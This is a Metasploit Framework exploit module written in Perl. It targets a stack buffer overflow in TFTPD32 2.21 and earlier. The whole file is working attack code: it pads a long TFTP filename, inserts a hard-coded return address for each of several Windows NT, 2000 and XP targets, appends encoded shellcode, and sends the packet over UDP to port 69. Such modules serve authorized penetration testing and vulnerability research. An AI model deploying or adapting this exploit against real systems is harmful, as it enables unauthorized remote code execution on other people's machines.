
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::tftpd32_long_filename;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {

	'Name'     => 'TFTPD32 <= 2.21 Long Filename Buffer Overflow',
	'Version'  => '$Revision: 1.1 $',
	'Authors'  => [ 'y0 [at] w00t-shell.net', ],
	'Arch'     => [ 'x86' ],
	'OS'       => [ 'win32', 'winnt', 'win2000', 'winxp' ],
	'Priv'     => 0,
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 69],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },
	'AutoOpts' => { 'EXITFUNC' => 'process' },
	'Payload' =>
	  {
		'Space'     => 250,
		'BadChars'  => "\x00",
		'Prepend'   => "\x81\xc4\xff\xef\xff\xff\x44",
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
	This module exploits a stack overflow in TFTPD32 version 2.21
and prior. By sending a request for an overly long file name
to the tftpd32 server, a remote attacker could overflow a buffer and
execute arbitrary code on the system.
}),

	'Refs'  =>  [
		['BID', '6199'],
	  ],

	'Targets' =>
	  [
		['WindowsNT SP6a English',       0x77f9d463],
		['Windows 2000 PRO SP4 English', 0x7c2ec663],
		['Windows XP SP0 Pro English',   0x77dc0df0],
		['Windows XP SP1 Pro English',   0x77dc5527],
	  ],
	'Keys' => ['tftp'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	my $sploit =
	  "\x00\x01". Pex::Text::AlphaNumText(120). ".".
	  Pex::Text::AlphaNumText(135). pack('V', $target->[1]).
	  $shellcode. "\x00";

	$self->PrintLine(sprintf("[*] Trying to exploit target %s 0x%.8x", $target->[0], $target->[1]));

	my $s = Msf::Socket::Udp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($sploit);
	$self->Handler($s);
	$s->Close();
	return;
}

1;
